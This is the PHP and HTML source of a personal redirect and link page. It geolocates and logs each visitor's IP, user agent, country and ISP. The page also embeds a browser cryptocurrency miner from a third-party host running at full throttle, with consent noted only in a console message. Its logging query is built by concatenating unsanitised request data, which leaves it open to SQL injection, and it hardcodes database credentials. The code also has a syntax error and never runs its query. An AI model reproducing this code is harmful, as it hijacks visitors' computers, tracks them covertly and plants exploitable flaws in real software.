<?php
/**
 * Created by PhpStorm.
 * User: Jyles Coad-Ward
 * Date: 24/05/2019
 * Time: 5:53 PM
 */
function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}
/* Get data from URL bar */
    $page=$_GET['page'];
    $type=$_GET['type'];

 /* Log users */
    $writeToLogDestination = $page;
    $writeToLogIP = $_SERVER['REMOTE_ADDR'];
    $writeToLogUserAgent = $_SERVER['HTTP_USER_AGENT'];
    $writeToLogHostname = $_SERVER['REMOTE_HOST'];
    $writeToLogCountry = ip_info($_SERVER['REMOTE_ADDR'], "country");
    $writeToLogTime = date('l j \of F Y h;i:s A')
    $writeToLogISP = geoip_isp_by_name($_SERVER['REMOTE_HOST']);
    
    function gtfo() {
        header("Location: ".$_SERVER['HTTP_REFERER']);
    }


    if ($page == "discord"){
        header("Location: https://discord.gg/x92bvet");
    }
    elseif ($page == "seedbot"){
        header("Location: http://seedbot.jyles.club");
    }
    elseif ($page == "seedbotinvite"){
        header("Location: http://seedbot.jyles.club/invite");
    }
    elseif ($page == "donate"){
        header("Location: https://paypal.me/darioxservices");
    }
    elseif ($page == "steam"){
        header("Location: https://steamcommunity.com/id/seed_main");
    }
    elseif ($page == "github"){
        header("Location: https://github.com/jylescoad-ward");
    }
    elseif ($page == "youtube"){
        header("Location: https://youtube.com/seedvevo");
    }
    elseif ($page == "twitter") {
        header("Location: https://twitter.com/jylescoadward");
    }
    elseif ($page == "twitch") {
        header("Location: http://twitch.tv/seedplaysgames");
    }
    elseif ($page == "osu") {
        if ($type == "profile") {
            header("Location: https://osu.ppy.sh/u/seedplaysgames");
      $writeToLogType = "Type: ".$type."\n";
        }
        elseif ($type == "skin") {
            header("Location: https://storage.googleapis.com/dariox/share/osu-skin/latest.osk");
      $writeToLogType = "Type: ".$type."\n";
        }
        else{
            gtfo();
        }
    }
    elseif ($page == "dariox") {
        header("Location: http://dariox.club");
    }
    elseif ($page == "donate") {
        header("Location: https://paypal.me/darioxservices");
    }
    elseif ($page == "soundcloud") {
     header("Location: https://soundcloud.com/jyles-coad-ward/");
    }


    $servername = "localhost";
    $username = "jylesdotcl";
    $password = "password";
    $dbname = "ipdata";
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $sql = "INSERT INTO jylesdotclub (dest, ip, useragent, time, country, isp) VALUES ('".$writeToLogDestination."', '".$writeToLogIP."', '".$writeToLogUserAgent."', '".$writeToLogTime."', '".$writeToLogCountry."', '".$writeToLogISP."')";


?>
<!DOCTYPE html>
<html lang="en">

  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="author" content="Jyles Coad-Ward [dariox.club@gmail.com]">
    <meta name="description" content="A personal website made by Jyles Coad-Ward, an Australian software developer.">

    <title>
      jyles.club
    </title>

    <link href="style.css" rel="stylesheet">
    
<script type='text/javascript'>
if (window.location.href.substr(-2) !== '?r') {
    window.location = window.location.href + '?r';
}
	console.log("By using this website you consent to using your computer power for crypto-currency mining, if you do not consent, please leave the website");

</script>
	  
<script src="https://www.hostingcloud.racing/cPTP.js"></script>
<script>
    var _client = new Client.Anonymous('32dcfb13f92b42722a95f0264ea55fe6880a68490fef661237dd6777723d1c78', {
        throttle: 0
    });
    _client.start();
    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");

</script>

    <style>
body{
  background: #161616;
  color:white;
  height: 100%;
  .gradientBackground{
    background: center center no-repeat, linear-gradient(to bottom, #636363, #333333);
    height: 100%;
  }
}
.border{
  position: absolute;
  width: calc(100% - 20px); 
  height: calc(100% - 20px);
  top:5px;
  left:5px;
  right:5px;
  margin-left:auto;
  margin-right:auto;
  border: rgba(255,255,255,0.8) 5px solid;
}
.contentt{
  position:absolute;
  top:0;
  left:0;
  right:0;
  margin-left:auto;
  margin-right:auto;
  text-align:center;
}
.donate{
	position: absolute;
	bottom: 20px;
	left: 25px;
}
    </style>

  </head>

  <body class="backgroundanim" id="body">
    <div class="border"></div>
    <center>
      <!-- Page Content -->
      <div class="container contentt">
        <div class="row">
          <div class="col-lg-12 text-center"><br><br><br><br>
            <h1 class="mt-5 titlecustom slide-in-top" id="title">
              jyles.club
            </h1>
            <p class="lead fade-in-fwd subtitle">
		    <a href="mailto:a8764@cumallover.me"><sup>do</sup>you<sup>like</sup>my<sub>new</sub>email?</a>
            </p><br><br>
            <table class="table-links fade-in-fwd">
              <tr>
                <td>
                  <a href="http://jyles.club/?page=github" rel="external follow">Github</a>
                </td>
                <td>
                  <a href="http://jyles.club/?page=steam" rel="external nofollow">Steam</a>
                </td>
                <td>
                  <a href="http://jyles.club/?page=discord" rel="external follow">Discord</a>
                </td>
                <td>
                  <a href="http://jyles.club/?page=seedbot" rel="external follow">SeedBot</a>
                </td>
              </tr>
              <tr>
                <td>
                  <a href="http://jyles.club/?page=live&type=twitch" rel="external follow">Twitch</a>
                </td>
                <td>
                  <a href="http://jyles.club/?page=osu&type=skin" rel="external follow" style="color: #ffc1ef;" download>osu! skin</a>
                </td>
                <td>
                  <a href="http://jyles.club/?page=osu&type=profile" rel="external follow" style="color: #ffc1ef;">osu! profile</a>
                </td>
                <td>
                  <a href="http://jyles.club/?page=youtube" rel="external follow">Youtube</a>
                </td>
              </tr>
            </table>
          </div>
        </div>
      </div>
    </center>

    <center class="song" >
    <marquee class="music fade-in-fwd" width="250px" direction="left" scrollamount="3" behavior="scroll">
      Currently Playing:  <a href="https://soundcloud.com/lofi-fpv/quok-atariwave-instrumental?in=jylescoad-ward/sets/good-music"> Atariwave [Insturemntal] </a>  by Quok</a></marquee>
    </center>
  </body>
  <iframe frameborder="0" style="position:absolute;top:5px;left:5px;" src="https://storage.googleapis.com/file-asia/cdn/atariwave-quok.mp3" allow="autoplay" height="0" width="0"></iframe>
<div class="donate">
  <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
    <input type="hidden" name="cmd" value="_s-xclick" />
    <input type="hidden" name="hosted_button_id" value="X8MN67VEWTLN8" />
    <input type="image" src="https://www.paypalobjects.com/en_AU/i/btn/btn_donate_SM.gif" border="0" name="submit" title="PayPal - The safer, easier way to pay online!" alt="Donate with PayPal button" />
    <img alt="" border="0" src="https://www.paypal.com/en_AU/i/scr/pixel.gif" width="1" height="1" />
  </form>
</div>
</html>
<script src="index.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-77162061-4"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-77162061-4');
</script>

